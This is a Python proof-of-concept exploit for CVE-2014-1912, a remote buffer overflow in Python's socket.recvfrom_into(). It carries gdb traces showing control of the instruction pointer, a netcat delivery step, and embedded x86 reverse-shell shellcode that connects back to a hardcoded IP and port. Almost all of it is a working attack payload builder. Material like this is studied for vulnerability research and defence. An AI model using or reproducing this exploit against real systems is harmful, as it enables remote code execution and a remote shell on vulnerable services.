#!/usr/bin/env python

'''
# Exploit Title: python socket.recvfrom_into() remote buffer overflow
# Date: 21/02/2014
# Exploit Author: @sha0coder
# Vendor Homepage: python.org
# Version: python2.7 and python3
# Tested on: linux 32bit + python2.7
# CVE : CVE-2014-1912



socket.recvfrom_into() remote buffer overflow Proof of concept
by @sha0coder

TODO: rop to evade stack nx 


(gdb) x/i $eip
=> 0x817bb28:	mov    eax,DWORD PTR [ebx+0x4]       <--- ebx full control => eax full conrol
   0x817bb2b:	test   BYTE PTR [eax+0x55],0x40
   0x817bb2f:	jne    0x817bb38 -->
   ...
   0x817bb38:	mov    eax,DWORD PTR [eax+0xa4]      <--- eax full control again
   0x817bb3e:	test   eax,eax
   0x817bb40:	jne    0x817bb58 -->
   ...
   0x817bb58:	mov    DWORD PTR [esp],ebx
   0x817bb5b:	call   eax <--------------------- indirect fucktion call ;)


$ ./pyrecvfrominto.py 
	egg file generated

$ cat egg | nc -l 8080 -vv

... when client connects ... or wen we send the evil buffer to the server ...

0x0838591c in ?? ()
1: x/5i $eip
=> 0x838591c:	int3    			<--------- LANDED!!!!!
   0x838591d:	xor    eax,eax
   0x838591f:	xor    ebx,ebx
   0x8385921:	xor    ecx,ecx
   0x8385923:	xor    edx,edx

'''

import struct

def off(o):
	return struct.pack('L',o)


reverseIP = '\xc0\xa8\x04\x34'   #'\xc0\xa8\x01\x0a'
reversePort = '\x7a\x69'


#shellcode from exploit-db.com, (remove the sigtrap)
shellcode = "\xcc\x31\xc0\x31\xdb\x31\xc9\x31\xd2"\
			"\xb0\x66\xb3\x01\x51\x6a\x06\x6a"\
			"\x01\x6a\x02\x89\xe1\xcd\x80\x89"\
			"\xc6\xb0\x66\x31\xdb\xb3\x02\x68"+\
			reverseIP+"\x66\x68"+reversePort+"\x66\x53\xfe"\
			"\xc3\x89\xe1\x6a\x10\x51\x56\x89"\
			"\xe1\xcd\x80\x31\xc9\xb1\x03\xfe"\
			"\xc9\xb0\x3f\xcd\x80\x75\xf8\x31"\
			"\xc0\x52\x68\x6e\x2f\x73\x68\x68"\
			"\x2f\x2f\x62\x69\x89\xe3\x52\x53"\
			"\x89\xe1\x52\x89\xe2\xb0\x0b\xcd"\
			"\x80"


shellcode_sz = len(shellcode)

print 'shellcode sz %d' % shellcode_sz


ebx =  0x08385908
sc_off = 0x08385908+20

padd = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMM'

'''           
        +------------+----------------------+         +--------------------+
        |            |                      |         |                    |
        V            |                      |         V                    |
'''
buff = 'aaaa' + off(ebx) + 'aaaaaAAA'+ off(ebx) + shellcode + padd + off(sc_off)  # .. and landed ;)


print 'buff sz: %s' % len(buff)
open('egg','w').write(buff)